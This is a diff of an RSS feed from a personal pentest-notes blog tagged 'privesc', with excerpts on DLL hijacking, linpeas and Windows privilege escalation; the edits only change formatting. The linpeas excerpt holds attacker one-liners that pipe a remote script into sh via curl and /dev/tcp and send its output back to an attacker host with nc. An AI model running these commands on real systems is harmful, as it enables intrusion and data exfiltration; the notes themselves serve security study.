@@ -1,43 +1,32 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>privesc on Owlglass</title>
+    <title>PrivEsc on Owlglass</title>
     <link>https://kdbed.github.io/tags/privesc/</link>
-    <description>Recent content in privesc on Owlglass</description>
+    <description>Recent content in PrivEsc on Owlglass</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="https://kdbed.github.io/tags/privesc/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language>
+    <atom:link href="https://kdbed.github.io/tags/privesc/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>DLL Hijacking</title>
       <link>https://kdbed.github.io/posts/dll_hijacking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>https://kdbed.github.io/posts/dll_hijacking/</guid>
-      <description>Basic Ideas Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL. Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely. hackTricks
-Approaches There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.
-   </description>
+      <description>Basic Ideas Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL. Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely. hackTricks&#xA;Approaches There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.</description>
     </item>
-    
     <item>
       <title>linpeas</title>
       <link>https://kdbed.github.io/posts/linpeas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>https://kdbed.github.io/posts/linpeas/</guid>
-      <description>See carlospolop : PEASS-ng hacktricks
-Execution: Run from memory and send back to attacker:
-# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
+      <description>See carlospolop : PEASS-ng hacktricks&#xA;Execution: Run from memory and send back to attacker:&#xA;# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
     </item>
-    
     <item>
       <title>Pentest - Windows Privilege Escalation</title>
       <link>https://kdbed.github.io/posts/pentest_windows_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>https://kdbed.github.io/posts/pentest_windows_privilege_escalation/</guid>
-      <description>From Service to SYSTEM Service Account Privileges Services can be run such that they don&amp;rsquo;t maintain the privs of NT AUTHORITY\LOCAL SERVICE account, eg with the -k LocalServiceAndNoImpersonation option.
- The task scheduler can be used to restore default privs: FullPowers itm4n. After executing FullPowers:
- </description>
+      <description>From Service to SYSTEM Service Account Privileges Services can be run such that they don&amp;rsquo;t maintain the privs of NT AUTHORITY\LOCAL SERVICE account, eg with the -k LocalServiceAndNoImpersonation option.&#xA;The task scheduler can be used to restore default privs: FullPowers itm4n. After executing FullPowers:</description>
     </item>
-    
   </channel>
 </rss>
